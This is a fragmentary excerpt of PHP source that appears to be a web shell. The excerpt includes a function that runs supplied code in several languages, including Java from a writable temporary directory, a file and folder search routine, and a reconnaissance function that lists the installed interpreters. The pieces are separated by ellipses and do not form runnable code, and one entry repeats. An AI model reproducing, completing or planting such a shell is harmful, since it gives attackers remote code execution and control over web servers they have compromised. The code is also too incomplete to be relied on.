...
if(!function_exists('get_filesize')){function get_filesize($file){
		$size = @filesize($file);
		if($size!==false){
			if($size<=0) return 0;
...
if(!function_exists('eval_go')){
	function eval_go($evalType, $evalCode, $evalOptions, $evalArguments){
		...
		elseif($evalType=="java"){
			$tmpdir = get_writabledir();chdir($tmpdir);
...
elseif(isset($p['findType'])){
	...
	foreach($candidate as $k){if(($findType=="file")||($findType=="folder")){
			if(!empty($findName)){
...
if(!function_exists('info_getinfo')){
	function info_getinfo(){
		...
		$res .= "<tr><td>php</td><td>".phpversion()."</td></tr>";$access = array("python"=>"python -V",
						"perl"=>"perl -e \"print \$]\"",
						"python"=>"python -V",
						"ruby"=>"ruby -v",
						"node"=>"node -v",
